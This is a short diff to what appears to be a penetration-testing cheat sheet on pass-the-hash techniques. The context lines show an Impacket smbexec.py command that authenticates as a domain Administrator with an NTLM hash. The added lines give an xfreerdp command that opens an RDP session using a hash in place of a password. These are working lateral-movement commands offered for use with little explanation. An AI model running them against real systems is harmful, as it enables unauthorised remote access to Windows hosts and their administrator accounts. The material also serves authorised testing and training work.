@@ -46,3 +46,8 @@ smbexec.py <domain>/<username>@<target> -hashes <LMhash>:<NThash>
 smbexec.py DOMAIN/Administrator@192.168.1.20 -hashes aad3b435b51404eeaad3b435b51404ee:6b3a55e0261b0304143f805a249b850a
 
 ```
+
+using hash to gain RDP sessions :
+```bash
+xfreerdp /v:192.168.44.163 /u:Administrator /pth:<NTLM>
+```
